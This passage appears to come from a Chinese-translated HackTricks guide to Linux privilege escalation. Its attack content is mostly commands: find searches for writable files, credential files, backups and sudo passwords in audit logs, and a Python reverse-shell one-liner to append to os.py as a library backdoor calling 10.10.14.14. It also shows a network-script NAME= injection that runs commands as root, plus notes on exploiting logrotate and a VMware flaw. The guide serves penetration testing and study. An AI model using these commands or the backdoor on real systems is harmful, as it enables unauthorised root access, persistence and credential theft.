find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知可能包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **可能包含密码的若干文件**。\
**另一个有趣的工具** 是: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，它是一个开源应用，用于检索存储在本地计算机上的大量密码，适用于 Windows、Linux & Mac。

### 日志

如果你能读取日志，可能会在其中找到 **有趣/机密的信息**。日志越异常，可能越有价值（可能）。\
另外，一些被“**不当**”配置（或被植入后门？）的 **audit logs** 可能允许你在 audit logs 中**记录密码**，正如这篇文章所说明的： [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了 **read logs the group** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有用。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件名或内容中包含词 "**password**" 的文件，也要在日志中检查 IPs 和 emails，或检查 hashes regexps。\
我不会在这里列出如何完成所有这些操作，但如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python library hijacking

如果你知道从 **哪里** 会执行一个 python 脚本，并且你 **可以写入** 那个文件夹，或者你可以 **修改 python libraries**，你就可以修改 OS library 并为其植入后门（如果你可以写入 python 脚本将被执行的地方，复制并粘贴 os.py library）。

要 **backdoor the library**，只需在 os.py library 的末尾添加以下一行（更改 IP 和 PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **写权限** 的用户可能获得提权。这是因为 `logrotate` 通常以 **root** 身份运行，可能被操纵去执行任意文件，特别是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是不仅要检查 _/var/log_ 的权限，还要检查任何应用日志轮转的目录的权限。

> [!TIP]
> 此漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

关于此漏洞的更多详细信息请参见此页面： [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 利用此漏洞。

此漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** 非常相似，因此每当你发现可以修改日志时，检查谁在管理这些日志，并检查是否可以通过将日志替换为符号链接来提权。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果出于任何原因，用户能够在 _/etc/sysconfig/network-scripts_ 中 **写入** 一个 `ifcf-<whatever>` 脚本，或者能够 **调整** 一个现有脚本，那么你的 **system is pwned**。

网络脚本，例如 _ifcg-eth0_，用于网络连接。它们的格式看起来完全像 .INI 文件。然而，它们在 Linux 上由 Network Manager (dispatcher.d) 以 \~sourced\~ 的方式处理。

在我的案例中，这些网络脚本中的 `NAME=` 属性未被正确处理。如果名称中有 **空格/空白，系统会尝试执行空格后面的部分**。这意味着 **第一个空格之后的所有内容都会以 root 身份执行**。

例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 和 /bin/id 之间的空格_)

### **init, init.d, systemd, and rc.d**

目录 `/etc/init.d` 存放 System V init (SysVinit) 的脚本，是经典的 Linux 服务管理系统。它包含用于 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，或通过位于 `/etc/rc?.d/` 的符号链接执行。Redhat 系统的替代路径为 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 Upstart 相关联，Upstart 是 Ubuntu 引入的较新的服务管理系统，使用配置文件来管理服务任务。尽管已向 Upstart 过渡，但由于 Upstart 中包含兼容层，SysVinit 脚本仍会与 Upstart 配置一起使用。

**systemd** 是一种现代的初始化和服务管理器，提供按需启动 daemon、自动挂载管理和系统状态快照等高级功能。它将文件组织在 `/usr/lib/systemd/`（用于发行版包）和 `/etc/systemd/system/`（供管理员修改）中，从而简化系统管理流程。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 通常 hook 一个 syscall，将内核的特权功能暴露给 userspace manager。弱的 manager 认证（例如基于 FD-order 的签名检查或糟糕的密码机制）可能允许本地 app 冒充该 manager，从而在已被 root 的设备上升级到 root。了解更多及利用细节见：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

在 VMware Tools/Aria Operations 中，基于 Regex 的服务发现可以从进程命令行中提取二进制路径，并在特权上下文中使用 `-v` 执行它。宽松的匹配模式（例如使用 \S）可能会匹配放置在可写位置（例如 /tmp/httpd）中的攻击者监听器，导致以 root 执行（CWE-426 Untrusted Search Path）。

在此了解更多并查看适用于其他发现/监控栈的一般化模式： 

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
